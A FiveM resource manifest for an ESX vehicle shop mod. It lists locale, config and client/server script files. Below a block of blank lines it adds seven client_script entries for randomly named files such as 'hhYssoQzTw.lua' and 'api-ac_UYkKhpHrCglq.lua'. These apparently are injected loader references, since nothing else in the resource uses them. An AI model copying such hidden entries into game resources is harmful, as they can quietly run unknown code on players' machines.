fx_version 'adamant'
games {'gta5'}
description 'ESX Vehicle Shop'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/utils.lua',
	'client/main.lua'
}

dependency 'es_extended'

export 'GeneratePlate'








client_script "api-ac_oVHJKzPROeBO.lua"

client_script 'hhYssoQzTw.lua'

client_script 'yNRAjBoDfD.lua'

client_script 'QqNzIQCOFF.lua'

client_script 'RttmwKmlas.lua'

client_script 'PaFQARUIWz.lua'
client_script "api-ac_UYkKhpHrCglq.lua"